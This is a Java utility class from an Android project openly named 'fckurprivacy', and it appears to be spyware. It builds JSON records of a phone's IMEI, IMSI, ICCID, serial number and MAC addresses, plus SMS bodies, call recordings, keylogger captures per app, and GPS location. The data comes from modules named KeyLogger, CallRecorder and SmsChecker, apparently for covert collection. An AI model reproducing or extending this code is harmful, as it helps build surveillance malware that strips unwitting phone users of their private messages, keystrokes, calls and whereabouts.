package com.vergermiya.harevost.fckurprivacy.Util;

import com.vergermiya.harevost.fckurprivacy.CallRecorder.CallRecord;
import com.vergermiya.harevost.fckurprivacy.CallRecorder.CallRecordJSon;
import com.vergermiya.harevost.fckurprivacy.InfoChecker.InfoJson;
import com.vergermiya.harevost.fckurprivacy.KeyLogger.KeyLogJson;
import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsJson;
import com.vergermiya.harevost.fckurprivacy.locationChecker.LocationJson;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONStringer;

import java.util.ArrayList;

/**
 * Created by harevost on 18-7-17.
 */


public class JsonBuilder {
    public JsonBuilder() {
        super();
    }

    public static JSONStringer buildInfoJson(InfoJson infoJson) {
        JSONStringer jsonText = new JSONStringer();
        try {
            jsonText.object();

            jsonText.key("Imei").value(infoJson.getImei());
            jsonText.key("Imsi").value(infoJson.getImsi());
            jsonText.key("DeviceVersion").value(infoJson.getDeviceVersion());
            jsonText.key("Iccid").value(infoJson.getIccid());
            jsonText.key("SerialNo").value(infoJson.getSerialNo());
            jsonText.key("DeviceType").value(infoJson.getDeviceType());
            jsonText.key("Ip").value(infoJson.getIp());
            jsonText.key("NetworkMac").value(infoJson.getNetworkMac());
            jsonText.key("BluetoothMac").value(infoJson.getBluetoothMac());

            jsonText.endObject();
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonText;
    }

    public static JSONStringer buildSmsJson(SmsJson smsJson) {
        JSONStringer jsonText = new JSONStringer();
        try {
            jsonText.object();

            jsonText.key("PhoneNumber").value(smsJson.getPhoneNumber());
            jsonText.key("ThreadId").value(smsJson.getThreadId());
            jsonText.key("Date").value(smsJson.getDate());
            jsonText.key("Type").value(smsJson.getType());
            jsonText.key("Body").value(smsJson.getBody());

            jsonText.endObject();
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonText;
    }

    public static JSONArray buildSmsJsons(ArrayList<SmsJson> smsJsons) {
        JSONArray jsonArray = new JSONArray();
        for (SmsJson smsJson : smsJsons) {
            JSONStringer jsonText = buildSmsJson(smsJson);
            jsonArray.put(jsonText);
        }
        return jsonArray;
    }

    public static JSONStringer buildCallRecordJson(CallRecordJSon callRecordJSon) {
        JSONStringer jsonText = new JSONStringer();
        try {
            jsonText.object();

            jsonText.key("PhoneNumber").value(callRecordJSon.getPhoneNumber());
            jsonText.key("Date").value(callRecordJSon.getCallDate());
            jsonText.key("Type").value(callRecordJSon.getCallType());
            jsonText.key("File").value(callRecordJSon.getCallFile());

            jsonText.endObject();
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonText;
    }

    public static JSONArray buildCallRecordJsons(ArrayList<CallRecordJSon> callRecordJSons) {
        JSONArray jsonArray = new JSONArray();
        for (CallRecordJSon callRecordJSon : callRecordJSons) {
            JSONStringer jsonText = buildCallRecordJson(callRecordJSon);
            jsonArray.put(jsonText);
        }
        return jsonArray;
    }

    public static JSONStringer buildKeyLogJson(KeyLogJson keyLogJson) {
        JSONStringer jsonText = new JSONStringer();
        try {
            jsonText.object();

            jsonText.key("Date").value(keyLogJson.getLogDate());
            jsonText.key("App").value(keyLogJson.getLogApp());
            jsonText.key("Data").value(keyLogJson.getLogData());

            jsonText.endObject();

        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonText;
    }

    public static JSONStringer buildLocJson(LocationJson locationJson) {
        JSONStringer jsonText = new JSONStringer();
        try {
            jsonText.object();

            jsonText.key("Date").value(locationJson.getDate());
            jsonText.key("Latitude").value(locationJson.getLatitude());
            jsonText.key("Longitude").value(locationJson.getLongitude());
            jsonText.key("Location").value(locationJson.getRealLoc());
            jsonText.key("Type").value(locationJson.getType());

            jsonText.endObject();

        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonText;
    }
}






